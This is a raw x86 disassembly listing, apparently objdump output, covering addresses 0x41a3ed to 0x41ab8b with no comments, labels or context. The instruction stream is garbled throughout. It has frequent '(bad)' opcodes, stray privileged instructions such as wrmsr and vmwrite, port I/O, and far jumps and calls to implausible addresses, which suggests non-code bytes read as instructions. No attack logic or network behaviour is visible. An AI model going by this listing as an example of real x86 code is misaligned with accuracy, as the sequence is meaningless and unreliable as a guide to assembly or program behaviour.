  41a3ed:	pop    eax
  41a3ee:	pop    esp
  41a3ef:	inc    edx
  41a3f0:	sub    DWORD PTR [eax],ebx
  41a3f2:	ret    0xbaa6
  41a3f5:	outs   dx,DWORD PTR ds:[esi]
  41a3f6:	mov    edx,0xbd153224
  41a3fb:	cmp    bh,dh
  41a3fd:	push   esp
  41a3fe:	cmp    sp,WORD PTR [ebp-0x50cbebfc]
  41a405:	push   esi
  41a406:	int    0x61
  41a408:	test   al,0xd2
  41a40a:	in     al,0x58
  41a40c:	(bad)  
  41a40d:	xchg   ebx,eax
  41a40e:	push   esp
  41a40f:	rcr    BYTE PTR [esi+0x54],1
  41a412:	cmp    al,0xd9
  41a414:	inc    edi
  41a415:	pop    eax
  41a416:	clc    
  41a417:	les    esp,FWORD PTR [edx+esi*2]
  41a41a:	jp     0x41a482
  41a41c:	adc    DWORD PTR [ebx+eiz*4-0x123bf7b5],edi
  41a423:	push   ebp
  41a424:	pop    ebp
  41a425:	into   
  41a426:	adc    ebp,DWORD PTR [ebx]
  41a428:	mov    edi,0xeb4c1cf6
  41a42d:	mov    eax,ds:0x34acc9e1
  41a432:	iret   
  41a433:	hlt    
  41a434:	fsubr  QWORD PTR [edx+edx*4+0x1b6d8538]
  41a43b:	add    al,0x8e
  41a43d:	out    0x2,al
  41a43f:	fmul   DWORD PTR [edi]
  41a441:	or     DWORD PTR [ebp+0x7364cc95],ecx
  41a447:	(bad)  [edx+0x7a]
  41a44a:	cmp    bh,BYTE PTR [ecx+0x0]
  41a44d:	xchg   BYTE PTR [edx],ch
  41a44f:	push   eax
  41a450:	std    
  41a451:	adc    al,0x52
  41a453:	sub    dl,BYTE PTR [esi+edi*2+0x53]
  41a457:	sub    al,0x4a
  41a459:	test   bl,0xd8
  41a45c:	mov    bl,0x16
  41a45e:	fmul   DWORD PTR [ebx+0x38]
  41a461:	pop    ax
  41a463:	pop    ds
  41a464:	pop    ebx
  41a465:	pop    ds
  41a466:	out    dx,al
  41a467:	or     eax,0x7d9743bc
  41a46c:	mov    ds:0xed9bd82b,al
  41a471:	retf   
  41a472:	mov    eax,0x20bcc39d
  41a477:	pop    es
  41a478:	push   esi
  41a479:	xlat   BYTE PTR ds:[ebx]
  41a47a:	mov    eax,0xf32e19ba
  41a47f:	sbb    esp,DWORD PTR [ebx+ebx*1-0x67]
  41a483:	sub    esi,DWORD PTR [eax+edx*8]
  41a486:	aaa    
  41a487:	sbb    BYTE PTR [eax-0x55e0f8d5],dl
  41a48d:	sti    
  41a48e:	jo     0x41a507
  41a490:	mov    al,ds:0xb2c0e904
  41a495:	xchg   ebx,eax
  41a496:	pop    eax
  41a497:	mov    eax,ds:0x504b00c0
  41a49c:	test   DWORD PTR ds:0xbd4d407,ebx
  41a4a2:	pusha  
  41a4a3:	rol    edx,cl
  41a4a5:	inc    esi
  41a4a6:	scas   eax,DWORD PTR es:[edi]
  41a4a7:	xor    esp,edi
  41a4a9:	mov    ebx,0x8dc2ee4a
  41a4ae:	rcr    DWORD PTR [ebx+0x44],0x33
  41a4b2:	test   BYTE PTR [ecx-0x6a71c048],ch
  41a4b8:	in     al,dx
  41a4b9:	push   esp
  41a4ba:	lods   al,BYTE PTR ds:[esi]
  41a4bb:	sar    DWORD PTR [esi-0x22],0x98
  41a4bf:	loopne 0x41a4c5
  41a4c1:	sti    
  41a4c2:	fwait
  41a4c3:	pushf  
  41a4c4:	ins    DWORD PTR es:[edi],dx
  41a4c5:	pop    edx
  41a4c6:	pop    ebx
  41a4c7:	les    ecx,FWORD PTR [esi-0x2d]
  41a4ca:	fcomp  st(7)
  41a4cc:	shl    DWORD PTR [esi-0xa4c766d],0xec
  41a4d3:	push   es
  41a4d4:	jb     0x41a4dc
  41a4d6:	and    BYTE PTR [esi+0x4bbdd6df],cl
  41a4dc:	xor    BYTE PTR [eax],ah
  41a4de:	add    BYTE PTR [edx+0x60],al
  41a4e1:	nop
  41a4e2:	mov    ds:0xc2a7983f,al
  41a4e7:	into   
  41a4e8:	js     0x41a4cc
  41a4ea:	imul   esp,edx,0x933fa92b
  41a4f0:	push   es
  41a4f1:	shl    edx,0xd0
  41a4f4:	push   0x274f686b
  41a4f9:	int    0x78
  41a4fb:	ficomp WORD PTR cs:[edi]
  41a4fe:	sub    eax,DWORD PTR [ebx-0x20]
  41a501:	push   0xffffffe6
  41a503:	push   eax
  41a504:	es push esp
  41a506:	push   ecx
  41a507:	out    0x6a,eax
  41a509:	and    ah,BYTE PTR [ebp-0x4710845b]
  41a50f:	mov    eax,0xc966aa64
  41a514:	cs add eax,esi
  41a517:	std    
  41a518:	sahf   
  41a519:	jno    0x41a517
  41a51b:	lock inc eax
  41a51d:	xchg   ecx,eax
  41a51e:	and    dl,dh
  41a520:	(bad)  
  41a521:	test   BYTE PTR [esi],bl
  41a523:	pop    ecx
  41a524:	and    ebx,DWORD PTR ds:0x97bc4ac8
  41a52a:	cmp    BYTE PTR [edi-0x7d639d51],0x47
  41a531:	ins    BYTE PTR es:[edi],dx
  41a532:	add    al,0xed
  41a534:	scas   eax,DWORD PTR es:[edi]
  41a535:	test   BYTE PTR [ecx],ch
  41a537:	push   edx
  41a538:	out    0xc9,al
  41a53a:	lea    ebp,ds:0xac64adc7
  41a540:	std    
  41a541:	mov    ah,0xbf
  41a543:	push   ebx
  41a544:	mov    al,ds:0x96de51a1
  41a549:	mov    esi,0x9f2dcad5
  41a54e:	cmp    DWORD PTR [ebx],0xc3e25dd8
  41a554:	pop    ss
  41a555:	jmp    0x39b8:0x8ace922b
  41a55c:	leave  
  41a55d:	(bad)  
  41a55e:	popf   
  41a55f:	scas   al,BYTE PTR es:[edi]
  41a560:	pop    ss
  41a561:	ror    DWORD PTR [edx],1
  41a563:	push   esp
  41a564:	mov    ds:0x6b8f907d,eax
  41a569:	jmp    0x41a5c9
  41a56b:	loopne 0x41a557
  41a56d:	push   es
  41a56e:	(bad)  
  41a56f:	ficom  WORD PTR [ebx-0x18]
  41a572:	(bad)  
  41a573:	and    esi,DWORD PTR [edx+0x45]
  41a576:	bound  eax,QWORD PTR [ecx-0x22fd3c57]
  41a57c:	ja     0x41a5d6
  41a57e:	pop    es
  41a57f:	mov    bl,0x22
  41a581:	mov    cl,0xbe
  41a583:	or     DWORD PTR [ebp+0x16e9a3f1],ecx
  41a589:	jns    0x41a57a
  41a58b:	fild   QWORD PTR [eax]
  41a58d:	data16 jp 0x41a5ef
  41a590:	stos   DWORD PTR es:[edi],eax
  41a591:	fisubr WORD PTR [edx]
  41a593:	call   0x871458f2
  41a598:	lahf   
  41a599:	push   esp
  41a59a:	jmp    0x41a51d
  41a59c:	leave  
  41a59d:	rcr    BYTE PTR [ebx+0x7b226ab5],0xd4
  41a5a4:	fisttp QWORD PTR [eax+0x57c98a5e]
  41a5aa:	in     eax,0xfa
  41a5ac:	ss aad 0x60
  41a5af:	dec    esi
  41a5b0:	stc    
  41a5b1:	xchg   ebx,eax
  41a5b2:	sti    
  41a5b3:	jp     0x41a630
  41a5b5:	xor    BYTE PTR [esi+0x7094b601],bh
  41a5bb:	cmp    BYTE PTR [edi],cl
  41a5bd:	fcomp  DWORD PTR [eax]
  41a5bf:	aaa    
  41a5c0:	sub    BYTE PTR [eax+edi*1],cl
  41a5c3:	xchg   ebp,eax
  41a5c4:	test   eax,0x57035edf
  41a5c9:	mov    esi,0x5b107345
  41a5ce:	mov    ds:0xa73e6aa2,eax
  41a5d3:	mov    dl,0xe8
  41a5d5:	into   
  41a5d6:	loope  0x41a586
  41a5d8:	loope  0x41a5e1
  41a5da:	push   ss
  41a5db:	ror    BYTE PTR [eax-0x4e],0x82
  41a5df:	(bad)  
  41a5e0:	loop   0x41a618
  41a5e2:	push   ecx
  41a5e3:	popa   
  41a5e4:	sbb    DWORD PTR [ebx-0x8],ebp
  41a5e7:	add    DWORD PTR [ebx],edx
  41a5e9:	out    0xf4,al
  41a5eb:	mov    esp,0xfcf3988b
  41a5f0:	imul   esi,DWORD PTR [esp+0x2ab98af3],0x7f
  41a5f8:	mov    eax,0xdce6d3fb
  41a5fd:	setnp  dh
  41a600:	pop    ss
  41a601:	mov    esp,0x97092a63
  41a606:	ret    
  41a607:	hlt    
  41a608:	out    0xad,eax
  41a60a:	mov    DWORD PTR [edi+ebp*2-0x61],ebx
  41a60e:	ds mov ebp,cs
  41a611:	lods   eax,DWORD PTR ds:[esi]
  41a612:	mov    esi,0x3ce8eabb
  41a617:	jno    0x41a5ab
  41a619:	popf   
  41a61a:	call   FWORD PTR [edx]
  41a61c:	mov    ebx,0x3bfadd03
  41a621:	mov    dh,0xf8
  41a623:	scas   al,BYTE PTR es:[edi]
  41a624:	dec    DWORD PTR [ebx]
  41a626:	adc    DWORD PTR [ebx],ebx
  41a628:	dec    edi
  41a629:	jbe    0x41a696
  41a62b:	(bad)  
  41a62c:	push   ebx
  41a62d:	dec    ecx
  41a62e:	xor    eax,0x9dad33c3
  41a633:	sbb    BYTE PTR [ecx+0x290a2dc6],dh
  41a639:	add    eax,0x7343d843
  41a63e:	xor    DWORD PTR [ebp-0x4fb95617],eax
  41a644:	pop    ss
  41a645:	cwde   
  41a646:	enter  0xd45,0x8e
  41a64a:	or     bh,bh
  41a64c:	inc    eax
  41a64d:	push   0x2f8f37d2
  41a652:	loop   0x41a5e9
  41a654:	push   edi
  41a655:	outs   dx,BYTE PTR ds:[esi]
  41a656:	mov    al,ds:0x9bc8e4e3
  41a65b:	cli    
  41a65c:	jae    0x41a697
  41a65e:	in     eax,0xd6
  41a660:	cmp    eax,0xf7b6545f
  41a665:	pop    ebp
  41a666:	cmp    edx,ecx
  41a668:	dec    ebx
  41a669:	add    eax,0x99a8fca1
  41a66e:	fdiv   QWORD PTR [ebx-0x3b]
  41a671:	into   
  41a672:	ja     0x41a6af
  41a674:	cmp    al,0xb6
  41a676:	pop    ecx
  41a677:	test   DWORD PTR [ebx-0x47],edi
  41a67a:	or     ebx,DWORD PTR [edx]
  41a67c:	cmp    al,0xd4
  41a67e:	dec    ecx
  41a67f:	mov    edi,DWORD PTR [esi-0x39f60e94]
  41a685:	dec    ebx
  41a686:	mov    al,0xc6
  41a688:	cmp    al,0x7b
  41a68a:	mov    ebx,0x127ceef
  41a68f:	jp     0x41a6ab
  41a691:	shl    DWORD PTR [eax+0x23],1
  41a694:	mov    ch,0xcf
  41a696:	dec    ebp
  41a697:	inc    ebx
  41a698:	pop    esi
  41a699:	push   edx
  41a69a:	mov    al,0x63
  41a69c:	wrmsr  
  41a69e:	aad    0x7b
  41a6a0:	xor    eax,DWORD PTR [esi-0x37]
  41a6a3:	enter  0x3c5c,0xcf
  41a6a7:	mov    cl,0xb9
  41a6a9:	mov    ds:0xf47b2c6,eax
  41a6ae:	mov    dh,0xcc
  41a6b0:	mov    BYTE PTR [edi-0x210e848a],cl
  41a6b6:	ss jne 0x41a737
  41a6b9:	jmp    0x4b489dd9
  41a6be:	add    BYTE PTR [ecx],ch
  41a6c0:	cmp    eax,0xcb645fb6
  41a6c5:	outs   dx,BYTE PTR ds:[esi]
  41a6c6:	push   ebp
  41a6c7:	cmp    al,0xfb
  41a6c9:	mov    edi,esi
  41a6cb:	pusha  
  41a6cc:	out    0xcb,eax
  41a6ce:	sbb    al,0xb9
  41a6d0:	outs   dx,BYTE PTR ds:[esi]
  41a6d1:	xlat   BYTE PTR ds:[ebx]
  41a6d2:	jg     0x41a711
  41a6d4:	cmp    ah,BYTE PTR [edi+esi*8+0xdc049da]
  41a6db:	and    ch,BYTE PTR [ecx-0x1c]
  41a6de:	icebp  
  41a6df:	retf   0xba42
  41a6e2:	in     eax,dx
  41a6e3:	mov    edi,0x916ea33
  41a6e8:	ret    0xd1e8
  41a6eb:	mov    ecx,0xd3099573
  41a6f0:	add    BYTE PTR fs:[ebx-0x58],al
  41a6f4:	mov    ebp,0x5cfe4fc5
  41a6f9:	mov    ?,WORD PTR [eax+ecx*8+0x4f]
  41a6fd:	call   0xe3937c6c
  41a702:	hlt    
  41a703:	fnstsw WORD PTR [esi-0x7941a3b7]
  41a709:	stc    
  41a70a:	cwde   
  41a70b:	cwde   
  41a70c:	xchg   esp,eax
  41a70d:	or     DWORD PTR [edi-0x335eaa4c],ebx
  41a713:	jle    0x41a71d
  41a715:	mov    eax,0x58d617d8
  41a71a:	fisttp QWORD PTR [eax+0x7c3d9a52]
  41a720:	enter  0xff97,0x10
  41a724:	call   0xfef6:0x2180ac53
  41a72b:	loope  0x41a6c8
  41a72d:	(bad)  
  41a72e:	push   cs
  41a72f:	push   ds
  41a730:	cli    
  41a731:	out    0xd0,al
  41a733:	sbb    eax,ecx
  41a735:	mov    esp,0xe6e6612f
  41a73a:	xchg   edx,eax
  41a73b:	push   cs
  41a73c:	add    BYTE PTR [edi],bh
  41a73e:	les    esi,FWORD PTR [ecx-0x36]
  41a741:	mov    BYTE PTR [esi],cl
  41a743:	and    ch,ch
  41a745:	mov    ebx,0x8a0ceff
  41a74a:	into   
  41a74b:	test   al,0xe4
  41a74d:	mov    ds:0x745434ae,eax
  41a752:	pushf  
  41a753:	test   BYTE PTR [eax+0x71],0xa6
  41a757:	pop    esp
  41a758:	(bad)  
  41a759:	sub    DWORD PTR [edx+ebp*2+0x2f],esp
  41a75d:	test   BYTE PTR [esi-0x28069116],ah
  41a763:	xor    al,0x61
  41a765:	fstp   TBYTE PTR [ebx-0x2d50237c]
  41a76b:	mov    dh,0x99
  41a76d:	sbb    ebp,esi
  41a76f:	push   eax
  41a770:	mov    al,0x25
  41a772:	sbb    BYTE PTR [esp+eiz*2],0xda
  41a776:	adc    esi,ebp
  41a778:	in     al,dx
  41a779:	inc    eax
  41a77a:	mov    bh,0x56
  41a77c:	fmul   QWORD PTR [esi+edi*2+0x4e7a3eb6]
  41a783:	lds    ebp,FWORD PTR [ebp-0x6c]
  41a786:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a787:	repz scas al,BYTE PTR es:[edi]
  41a789:	xor    cl,cl
  41a78b:	fwait
  41a78c:	mov    dh,ch
  41a78e:	mov    al,ds:0xae20f4c2
  41a793:	and    DWORD PTR [edi+0x498eccba],0x21
  41a79a:	arpl   WORD PTR [eax-0x19101f2f],bp
  41a7a0:	jmp    0x1c4da5e4
  41a7a5:	and    al,0x8
  41a7a7:	loope  0x41a74b
  41a7a9:	push   ds
  41a7aa:	xchg   edx,eax
  41a7ab:	adc    bl,0x99
  41a7ae:	jmp    0x41a7f0
  41a7b0:	test   DWORD PTR [ecx+edi*8],edx
  41a7b3:	retf   0xf174
  41a7b6:	xchg   edi,eax
  41a7b7:	push   edx
  41a7b8:	pop    eax
  41a7b9:	outs   dx,BYTE PTR ds:[esi]
  41a7ba:	gs push edx
  41a7bc:	and    al,0x40
  41a7be:	sub    BYTE PTR [ebx+0x2fee2ad8],0x15
  41a7c5:	inc    ebx
  41a7c6:	add    bh,cl
  41a7c8:	or     BYTE PTR [eax-0x4f5cb482],bh
  41a7ce:	cmp    al,0x9f
  41a7d0:	ret    
  41a7d1:	push   ebx
  41a7d2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a7d3:	aad    0x8
  41a7d5:	jbe    0x41a822
  41a7d7:	add    eax,0xc26dbc8e
  41a7dc:	aam    0x85
  41a7de:	das    
  41a7df:	and    DWORD PTR [ebx+0x63198cbc],edx
  41a7e5:	popa   
  41a7e6:	fdiv   st(0),st
  41a7e8:	adc    eax,0x4ffb0b1c
  41a7ed:	rcr    DWORD PTR [ecx+0x661677bb],cl
  41a7f3:	mov    ebp,0xe058fa24
  41a7f8:	shl    esp,0x5b
  41a7fb:	xchg   ebx,eax
  41a7fc:	in     al,0x80
  41a7fe:	inc    esp
  41a7ff:	fwait
  41a800:	std    
  41a801:	sub    eax,0xe5dcd2c1
  41a806:	loopne 0x41a87b
  41a808:	in     eax,dx
  41a809:	jno    0x41a79b
  41a80b:	aas    
  41a80c:	jbe    0x41a795
  41a80e:	cmp    eax,0x73cc3d68
  41a813:	mov    ecx,0x92f9bdaf
  41a818:	popa   
  41a819:	mov    dh,0x78
  41a81b:	pushw  es
  41a81d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a81e:	mov    dl,0x85
  41a820:	stos   DWORD PTR es:[edi],eax
  41a821:	add    eax,0x4efcd5e4
  41a826:	jmp    0x41a7e4
  41a828:	add    eax,0x774285a5
  41a82d:	jno    0x41a7b8
  41a82f:	retf   0xa620
  41a832:	leave  
  41a833:	push   cs
  41a834:	xor    BYTE PTR [edi-0x7e6b7d8],bh
  41a83a:	push   edi
  41a83b:	ja     0x41a87a
  41a83d:	nop
  41a83e:	jmp    0x7c48:0x60cd321a
  41a845:	fild   DWORD PTR [edi-0x6691564e]
  41a84b:	xor    DWORD PTR [esi],ebp
  41a84d:	repz jae 0x41a888
  41a850:	adc    DWORD PTR [esi+0x8],ebp
  41a853:	vmwrite esi,DWORD PTR [edi-0x6eb1a66b]
  41a85a:	dec    edx
  41a85b:	jbe    0x41a831
  41a85d:	fs adc al,0x7e
  41a860:	sub    al,0x5
  41a862:	(bad)  
  41a863:	call   0x9ad2:0xaedc1b68
  41a86a:	adc    esp,DWORD PTR [edx]
  41a86c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a86d:	push   edi
  41a86e:	cmp    eax,0x3d62fe28
  41a873:	push   cs
  41a874:	pushf  
  41a875:	xchg   esp,eax
  41a876:	mov    edx,0x135f7fd1
  41a87b:	inc    esi
  41a87c:	sub    eax,0xac3af1b8
  41a881:	mov    dl,0xf
  41a883:	jns    0x41a88c
  41a885:	add    DWORD PTR [edx+0xfe2d9a6],ebp
  41a88b:	outs   dx,BYTE PTR ds:[esi]
  41a88c:	pop    es
  41a88d:	cmp    bl,BYTE PTR [edi]
  41a88f:	and    dl,ah
  41a891:	dec    esi
  41a892:	in     eax,0xde
  41a894:	xchg   edi,eax
  41a895:	cmp    esp,eax
  41a897:	mov    ebp,0xa918a332
  41a89c:	adc    BYTE PTR [ecx],bl
  41a89e:	lods   eax,DWORD PTR ds:[esi]
  41a89f:	add    eax,0xc8b39e6f
  41a8a4:	mov    dh,BYTE PTR [esi+edx*8+0x37cda39]
  41a8ab:	inc    eax
  41a8ac:	lea    eax,[ebx+esi*1-0x22]
  41a8b0:	add    DWORD PTR [edi+0x52],ebx
  41a8b3:	adc    DWORD PTR [edx+eax*1-0x7394dcb8],ebp
  41a8ba:	add    BYTE PTR [esi+0xe241452],0x53
  41a8c1:	pushf  
  41a8c2:	and    DWORD PTR [edx+0x1773f052],esp
  41a8c8:	mov    es,WORD PTR [esi+0x6d6fda4f]
  41a8ce:	fnsave [esi+0x4f9b8c57]
  41a8d4:	push   ebp
  41a8d5:	jnp    0x41a8dc
  41a8d7:	jp     0x41a89d
  41a8d9:	test   al,cl
  41a8db:	ret    0x9fc
  41a8de:	pop    edx
  41a8df:	xchg   esi,eax
  41a8e0:	retf   
  41a8e1:	stos   DWORD PTR es:[edi],eax
  41a8e2:	jmp    0x41a8b6
  41a8e4:	sub    eax,0xeea05010
  41a8e9:	ret    0xcf86
  41a8ec:	mov    ebx,0xebe3454d
  41a8f1:	iret   
  41a8f2:	xlat   BYTE PTR ds:[ebx]
  41a8f3:	jb     0x41a90e
  41a8f5:	ficom  DWORD PTR [edi-0x62]
  41a8f8:	loop   0x41a8a8
  41a8fa:	add    eax,0xffffffce
  41a8fd:	ja     0x41a941
  41a8ff:	fcomp  QWORD PTR [edx]
  41a901:	cdq    
  41a902:	sbb    eax,0x869d08e3
  41a907:	jecxz  0x41a910
  41a909:	sti    
  41a90a:	inc    esp
  41a90b:	adc    BYTE PTR [eax+0x71],bl
  41a90e:	adc    al,0x68
  41a910:	and    DWORD PTR [edx-0x33],0xfffffff9
  41a914:	arpl   WORD PTR [edx*1+0x6262581b],bx
  41a91b:	jo     0x41a927
  41a91d:	and    ah,bh
  41a91f:	ss nop
  41a921:	cmp    eax,0xd9c18a70
  41a926:	push   esi
  41a927:	neg    BYTE PTR [esi-0x1e]
  41a92a:	in     eax,dx
  41a92b:	mov    dh,0x9b
  41a92d:	stos   DWORD PTR es:[edi],eax
  41a92e:	(bad)  
  41a92f:	stos   BYTE PTR es:[edi],al
  41a930:	push   ebp
  41a931:	mov    al,ds:0x5da1a13c
  41a936:	sub    DWORD PTR [edi+0x21],ecx
  41a939:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a93a:	push   es
  41a93b:	push   esp
  41a93c:	int    0xdb
  41a93e:	mov    bh,BYTE PTR [edx-0x65]
  41a941:	or     bl,BYTE PTR [ebx+0x4c]
  41a944:	mov    ebp,0x4674435a
  41a949:	das    
  41a94a:	sbb    eax,0xacb8a577
  41a94f:	jo     0x41a9cc
  41a951:	scas   eax,DWORD PTR es:[edi]
  41a952:	shl    DWORD PTR [edi+0x6631330a],cl
  41a958:	arpl   WORD PTR [ecx+0x14],ax
  41a95b:	out    dx,al
  41a95c:	jbe    0x41a9ad
  41a95e:	and    edi,DWORD PTR [eax+0x559769b3]
  41a964:	or     al,0x4b
  41a966:	and    BYTE PTR [edx],dh
  41a968:	jg     0x41a9ac
  41a96a:	repz inc esp
  41a96c:	mov    eax,0xf95c5969
  41a971:	sbb    ch,ah
  41a973:	push   eax
  41a974:	les    ebx,FWORD PTR [esi-0x11]
  41a977:	call   DWORD PTR [ebx-0x7c]
  41a97a:	push   es
  41a97b:	fabs   
  41a97d:	stc    
  41a97e:	fdivr  QWORD PTR [eax-0x430ebec6]
  41a984:	jns    0x41a9b5
  41a986:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a987:	push   ds
  41a988:	jp     0x41a9d5
  41a98a:	sbb    al,0x41
  41a98c:	push   ebx
  41a98d:	test   esi,ebx
  41a98f:	sub    eax,0x1b563d95
  41a994:	pop    eax
  41a995:	push   esp
  41a996:	sub    dh,BYTE PTR [edx+ecx*8-0x7f16d004]
  41a99d:	push   edi
  41a99e:	setle  bl
  41a9a1:	mov    eax,0xba46b070
  41a9a6:	out    0x29,al
  41a9a8:	data16 in al,0xd9
  41a9ab:	push   0x39
  41a9ad:	popf   
  41a9ae:	cdq    
  41a9af:	fidivr WORD PTR [bx]
  41a9b2:	or     esi,eax
  41a9b4:	call   0x8801:0x619f0dc3
  41a9bb:	mov    ecx,DWORD PTR [esi]
  41a9bd:	mov    al,ds:0x65262beb
  41a9c2:	jmp    0xe471:0xfec57739
  41a9c9:	gs popf 
  41a9cb:	or     BYTE PTR [esi-0x6d6aba6c],cl
  41a9d1:	mov    ebx,0xdfb765fb
  41a9d6:	cdq    
  41a9d7:	or     BYTE PTR [eax+eax*2],bl
  41a9da:	or     al,0x9a
  41a9dc:	fisub  DWORD PTR gs:[edx-0x80]
  41a9e0:	or     al,0xf9
  41a9e2:	not    dh
  41a9e4:	mov    edx,0x85badfd9
  41a9e9:	js     0x41aa3e
  41a9eb:	jmp    0x825:0x676c0434
  41a9f2:	mov    eax,ds:0xb8a6e89e
  41a9f7:	jo     0x41a99e
  41a9f9:	adc    ch,BYTE PTR [ecx+esi*4-0x6]
  41a9fd:	xor    bh,BYTE PTR [eax-0x60b37147]
  41aa03:	or     al,0xfd
  41aa05:	rcr    DWORD PTR [ecx],1
  41aa07:	scas   al,BYTE PTR es:[edi]
  41aa08:	inc    ebp
  41aa09:	jmp    0xfa76:0xd8db45cd
  41aa10:	and    eax,0x7f2aeb9e
  41aa15:	push   ss
  41aa16:	cmp    esi,esp
  41aa18:	aad    0xb9
  41aa1a:	push   ecx
  41aa1b:	pop    ebp
  41aa1c:	pushf  
  41aa1d:	mov    DWORD PTR [ecx+ebp*1],ebx
  41aa20:	imul   esp,edi,0xfc07c751
  41aa26:	pop    esp
  41aa27:	imul   BYTE PTR [ebp+0x45]
  41aa2a:	jo     0x41aa6f
  41aa2c:	mov    dh,0x70
  41aa2e:	sbb    BYTE PTR [ecx+0xa],dl
  41aa31:	pop    esi
  41aa32:	jge    0x41aab2
  41aa34:	mov    eax,0x8db7bdff
  41aa39:	dec    ebp
  41aa3a:	mov    dl,BYTE PTR [ecx+0x418df60]
  41aa40:	stc    
  41aa41:	sub    DWORD PTR [ebp+0x3c],edi
  41aa44:	loopne 0x41aa54
  41aa46:	push   ebp
  41aa47:	stos   DWORD PTR es:[edi],eax
  41aa48:	inc    eax
  41aa49:	inc    eax
  41aa4a:	cwde   
  41aa4b:	cli    
  41aa4c:	mov    esp,DWORD PTR ds:0xc2349e4c
  41aa52:	outs   dx,BYTE PTR ds:[esi]
  41aa53:	mov    ch,0x59
  41aa55:	adc    ebx,DWORD PTR [ebx+edi*2]
  41aa58:	mov    dh,dl
  41aa5a:	xchg   esp,eax
  41aa5b:	mov    esi,0x6c8de070
  41aa60:	mov    ds:0x276e098,eax
  41aa65:	xchg   esp,eax
  41aa66:	ja     0x41aa09
  41aa68:	jno    0x41a9ec
  41aa6a:	and    al,bl
  41aa6c:	jmp    0x99d3264
  41aa71:	fldenv [eax-0x696a5eac]
  41aa77:	js     0x41aa8a
  41aa79:	int3   
  41aa7a:	fbstp  TBYTE PTR [esi]
  41aa7c:	clc    
  41aa7d:	xor    dl,cl
  41aa7f:	mov    dh,0xdf
  41aa81:	dec    ebp
  41aa82:	fld    TBYTE PTR [edi+0x663621c4]
  41aa88:	call   0x4891:0xd904ba82
  41aa8f:	sbb    eax,0x348a2e12
  41aa94:	mov    DWORD PTR ss:[esi-0x35],esp
  41aa98:	xor    bl,dh
  41aa9a:	lahf   
  41aa9b:	loopne 0x41aa1e
  41aa9d:	adc    al,0x52
  41aa9f:	cmc    
  41aaa0:	loopne 0x41aab8
  41aaa2:	jae    0x41aac2
  41aaa4:	(bad)  
  41aaa5:	(bad)
  41aaa9:	xor    ah,BYTE PTR [edi]
  41aaab:	repz xlat BYTE PTR ds:[ebx]
  41aaad:	ins    BYTE PTR es:[edi],dx
  41aaae:	jae    0x41aabd
  41aab0:	cmovg  esp,ebp
  41aab3:	ins    DWORD PTR es:[edi],dx
  41aab4:	inc    edx
  41aab5:	retf   0x2908
  41aab8:	xchg   edi,eax
  41aab9:	stos   BYTE PTR es:[edi],al
  41aaba:	test   DWORD PTR [eax],edi
  41aabc:	sub    dh,BYTE PTR [esi]
  41aabe:	mov    edi,DWORD PTR es:[ebp+0x16]
  41aac2:	fist   WORD PTR [ebx-0xca65ab2]
  41aac8:	inc    eax
  41aac9:	sar    BYTE PTR [ebx+0x63348898],cl
  41aacf:	inc    edx
  41aad0:	mov    cs,WORD PTR [edi+0x239e2021]
  41aad6:	(bad)  
  41aad7:	or     edi,esp
  41aad9:	stc    
  41aada:	data16 jo 0x41aadf
  41aadd:	imul   ebx,DWORD PTR [ebx-0x704c55e6],0xffffff84
  41aae4:	outs   dx,BYTE PTR ds:[esi]
  41aae5:	mov    DWORD PTR [eax],esp
  41aae7:	ss clc 
  41aae9:	mov    DWORD PTR [edi],eax
  41aaeb:	xchg   edi,eax
  41aaec:	popf   
  41aaed:	mov    bh,0x23
  41aaef:	sub    ebp,edi
  41aaf1:	std    
  41aaf2:	add    al,0x3a
  41aaf4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41aaf5:	pop    edi
  41aaf6:	out    0x34,al
  41aaf8:	fcomp  DWORD PTR [ecx+0x2f]
  41aafb:	sbb    eax,0x6ad5da53
  41ab00:	add    BYTE PTR ds:0x3fe17505,0xfa
  41ab07:	xchg   BYTE PTR [edx],dl
  41ab09:	arpl   WORD PTR [ecx-0x709efc73],ax
  41ab0f:	shl    BYTE PTR [esi-0x7b17ce7b],cl
  41ab15:	ins    DWORD PTR es:[edi],dx
  41ab16:	dec    ebp
  41ab17:	pop    es
  41ab18:	js     0x41ab6f
  41ab1a:	ja     0x41ab02
  41ab1c:	mov    WORD PTR [edi-0x24b40628],ss
  41ab22:	pop    eax
  41ab23:	push   ds
  41ab24:	add    esp,DWORD PTR [eax+0x1a]
  41ab27:	or     ch,bh
  41ab29:	inc    esp
  41ab2a:	aam    0x1f
  41ab2c:	bound  esi,QWORD PTR [eax-0x4d63f384]
  41ab32:	popf   
  41ab33:	jo     0x41aad6
  41ab35:	icebp  
  41ab36:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ab37:	sbb    esi,ebx
  41ab39:	push   es
  41ab3a:	mov    gs,edi
  41ab3c:	retf   
  41ab3d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ab3e:	jecxz  0x41ab0e
  41ab40:	inc    ebx
  41ab41:	xchg   esi,eax
  41ab42:	mov    dh,0xff
  41ab44:	es test al,0x2f
  41ab47:	mov    bh,0x71
  41ab49:	pop    edx
  41ab4a:	aas    
  41ab4b:	out    0xab,eax
  41ab4d:	pop    eax
  41ab4e:	push   esp
  41ab4f:	push   edx
  41ab50:	mov    ebx,0xc1edee0d
  41ab55:	pop    ds
  41ab56:	push   ecx
  41ab57:	or     eax,0x364d7d6
  41ab5c:	outs   dx,BYTE PTR ds:[esi]
  41ab5d:	nop
  41ab5e:	ins    DWORD PTR es:[edi],dx
  41ab5f:	fsub   st(7),st
  41ab61:	das    
  41ab62:	stos   BYTE PTR es:[edi],al
  41ab63:	je     0x41ab5f
  41ab65:	pop    esp
  41ab66:	add    DWORD PTR [ecx+0x40b03d4b],ebp
  41ab6c:	mov    dl,0x63
  41ab6e:	jnp    0x41ab22
  41ab70:	ss push ds
  41ab72:	es xor ebx,eax
  41ab75:	jae    0x41ab6a
  41ab77:	mov    bl,0xc9
  41ab79:	sub    BYTE PTR [ebp+0x3417b53c],ch
  41ab7f:	jmp    0x853da5b7
  41ab84:	mov    ecx,0xd3d3f04d
  41ab89:	sub    al,0xe7
  41ab8b:	idiv   DWORD PTR [ecx]
